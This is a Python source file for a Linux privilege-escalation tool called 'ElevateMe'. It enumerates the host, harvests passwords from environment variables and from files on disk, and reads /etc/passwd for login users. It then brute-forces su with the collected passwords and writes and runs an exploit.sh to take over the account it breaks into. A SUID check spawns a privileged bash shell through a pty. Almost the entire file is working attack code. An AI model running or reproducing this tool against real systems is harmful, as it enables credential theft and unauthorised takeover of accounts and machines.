import platform
import os
import grp
import subprocess
import getpass

class Colors:
    def __init__(self):
        self.red =  '\033[31m'
        self.reset = '\033[m'
        self.blue = '\033[34m'
        self.yellow = '\033[33m'
        self.green = '\033[32m'
        self.purple = '\033[35m'
        self.bold = '\033[1m'
        self.cyan = '\033[36m'

class General_info:
    def __init__(self):
        art = """
        ElevateMe
                """
        print(art)
        self.pid = os.getpid()
        self.colors = Colors()
        self.keywords = ['docker', 'entrypoint']
        self.binaries = [
    '/bin/ls', '/usr/bin/ls',
    '/bin/find', '/usr/bin/find',
    '/bin/awk', '/usr/bin/awk',
    '/bin/su', '/usr/bin/su',
    '/bin/chmod', '/usr/bin/chmod',
    '/bin/bash', '/usr/bin/bash',
    '/bin/sudo']
        self.found_binaries = []
        self.missing_binaries = []
    def sysinfo_fetcher(self):
        check = platform.system()
        if check != 'Linux':
            print(f'{self.colors.red} [-] Your operating system is not supported {self.colors.reset}')
        else:
            print(f'{self.colors.green}{self.colors.bold}[+] Spawned PID {self.colors.yellow} + {self.pid}, {self.colors.reset}')
            osVersion = platform.version()
            print(f'{self.colors.green}{self.colors.bold}[+] Detected OS {self.colors.yellow} + {osVersion}, {self.colors.reset}')
            runningUser = getpass.getuser()
            docker_cmd = 'ls -la /'
            docker_container = subprocess.run(docker_cmd, shell=True, stdout=subprocess.PIPE, text=True)
            if any(keyword in docker_container.stdout for keyword in self.keywords):
                    print(f'{self.colors.green}{self.colors.bold}[+] Docker container: True{self.colors.reset}')
            else:
                print(f'{self.colors.red}{self.colors.bold}[-] Docker container: False {self.colors.reset}')
            for binary in self.binaries:
                result = subprocess.run(['which', binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.returncode == 0:
                    self.found_binaries.append(binary)
                else:
                    self.missing_binaries.append(binary)
            if not self.missing_binaries:
                print(f'{self.colors.green}{self.colors.bold}[+] All binaries found {self.colors.reset}')
            else:
                print(f'{self.colors.red}{self.colors.bold}[-] Missing binaries: {self.colors.reset}{self.missing_binaries}')
            if runningUser == 'root':
                 print(f'{self.colors.green}{self.colors.bold}[+] Running as user {self.colors.red} + {runningUser}, {self.colors.reset}')
            else:
                 print(f'{self.colors.green}{self.colors.bold}[+] Running as user {self.colors.blue} + {runningUser}, {self.colors.reset}') 
            groupId = os.getgroups()
            print(f'{self.colors.green}{self.colors.bold}[+] Groups associated with user {self.colors.reset}')
            for id in groupId:
                groupInfo = grp.getgrgid(id)
                groupName = groupInfo.gr_name
                print(f'{self.colors.blue}{self.colors.bold} + {groupName}, {self.colors.reset}')
        
class Password_scanner:
    def __init__(self):
        self.passwords = []
        self.colors = Colors()
    def check_env(self):
        environmentVariables = os.environ
        passwordVariables = [(key, value) for key, value in environmentVariables.items() if any(keyword in key.lower() or keyword in value.lower() for keyword in ['pass', 'password', 'psswrd', 'psswd', 'p@ss', 'p@ssword', 'ps'])]
        if passwordVariables:
            print(f"{self.colors.green}{self.colors.bold}[+] Passwords found in env! {self.colors.reset}")
            for key, value in passwordVariables:
                self.passwords.append(value)
                print(f"{self.colors.cyan}{self.colors.bold} + {key}: {self.colors.cyan} + {value}, {self.colors.reset}")
                return self.passwords
        else:
             print(f"{self.colors.red}{self.colors.bold}[-] No obvious passwords in env {self.colors.reset}")  
             return          

    def check_files(self):
        output_list = []
        command = "(find * -type f -exec awk -F\"'\" '/^password=/{gsub(/^password=/,\"\",$2); print $2}' {} + 2>/dev/null ; find * -type f -exec awk -F'\"' '/^password=/{gsub(/^password=/,\"\",$2); print $2}' {} + 2>/dev/null) | cat"
        run = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, text=True)
        if run.stdout is not None:
            for line in run.stdout.split('\n'):
                output_list.append(line)
            output_list = [item for item in output_list if bool(item)]
            print(f"{self.colors.green}{self.colors.bold}[+] Passwords found in files!{self.colors.cyan}{self.colors.bold} {output_list} {self.colors.reset}")
            return output_list
        else:
            print(f"{self.colors.red}{self.colors.bold}[-] No obvious passwords found in files {self.colors.reset}")	
    
class User_scanner:
    def __init__(self):
        self.colors = Colors()
        self.shells = {
            '/bin/bash',
            '/bin/zsh',
            '/bin/dash',
            '/bin/sh',
            '/bin/csh',
            '/bin/tcsh',
            '/bin/ksh',
            '/bin/fish',
            '/usr/bin/bash',
            '/usr/bin/zsh',
            '/usr/bin/dash',
            '/usr/bin/csh',
            '/usr/bin/tcsh',
            '/usr/bin/ksh',
            '/usr/bin/fish',
            '/usr/bin/zsh'}

    def check_users(self):
        users = []
        with open('/etc/passwd', 'r') as passwdFile:
             for line in passwdFile:
                  parts = line.split(':')
                  username, shell = parts[0], parts[-1].strip()
                  if any(shell in s for s in self.shells):
                       users.append(username)       
        if users:
                 print(f'{self.colors.green}{self.colors.bold}[+] Users found! {self.colors.cyan}{self.colors.bold}{users}')
                 print(f'{self.colors.green}{self.colors.bold}[+] Switching user {self.colors.reset}')
                 
                 return users

class User_switcher:
    def __init__(self, passlist1, passlist2, users):
        self.colors = Colors()
        if passlist1 is None and passlist2 is None:
            return
        elif passlist1 is None:
            self.passwords = passlist2
        elif passlist2 is None:
            self.passwords = passlist1
        else:
            self.passwords = passlist1 + passlist2
        self.user_list = users
        self.pid = os.getpid()
       
    def switch_user(self):
        if len(self.passwords) == 0:
            print(f'{self.colors.red}{self.colors.bold}[-] No passwords found')
        else:
            for password in self.passwords:
                for user in self.user_list:
                    print(f"Trying password:{self.colors.cyan}{self.colors.bold} {password} {self.colors.reset}")
                    try:
                        proc = subprocess.run(['/usr/bin/su', user], input=(password + '\n').encode(), check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                        if proc.returncode == 0:
                            print(f"{self.colors.green}{self.colors.bold}[+] We are able to escalate to user{self.colors.blue} {user} {self.colors.green}with password {self.colors.blue}{password} {self.colors.reset}")  
                            # cmd = f"echo {password} | /usr/bin/su - {user} -c 'python3 -i -c \"import pty; pty.spawn(\\\"/bin/bash\\\")\"; kill {self.pid}'"
                            with open("exploit.sh", "w") as f:
                                f.write(f'#!/bin/bash\n')
                                f.write(f'su -l -s /bin/bash {user}')
                                f.close()
                            subprocess.run('chmod +x exploit.sh', shell=True, check=True)
                            subprocess.run('./exploit.sh', shell=True, check=True)
                            break
                    except subprocess.CalledProcessError as e:
                        print(f"{self.colors.red}{self.colors.bold} Failed to switch to user {user} {self.colors.reset}")

class Sudo_exploiter:
    def __init__(self):
        self.colors = Colors()
    
    def check_suid(self):
        command = 'find / -perm -4000 -type f 2>/dev/null'
        run = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
        if 'bash' in run.stdout:
            command = 'python3 -i -c \"import pty; pty.spawn(\\\"/bin/bash -p\\\")\";'
            subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
            print(run.stdout, end='')
        else:
            print(f'{self.colors.red}{self.colors.bold}[-] No SUID files found {self.colors.reset}')

    def check_sudo(self):
        command = f'sudo -l'
        run = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
        if run.returncode == 0:
            print(f'{self.colors.green}{self.colors.bold}[+] User can run: {self.colors.cyan}{run.stdout}{self.colors.reset}')
        else:
            print(f'{self.colors.red}{self.colors.bold}[-] User does not have sudo access {self.colors.reset}')

    def fetch_gtfo(self):
        pass

def main():
    general_info = General_info()
    general_info.sysinfo_fetcher()
    password_scanner = Password_scanner()
    l1 = password_scanner.check_env()
    l2 = password_scanner.check_files()
    user_scanner = User_scanner()
    users = user_scanner.check_users()
    user_switcher = User_switcher(l1, l2, users)
    user_switcher.switch_user()
    # sudo_exploiter = Sudo_exploiter()
    # sudo_exploiter.check_sudo()

main()





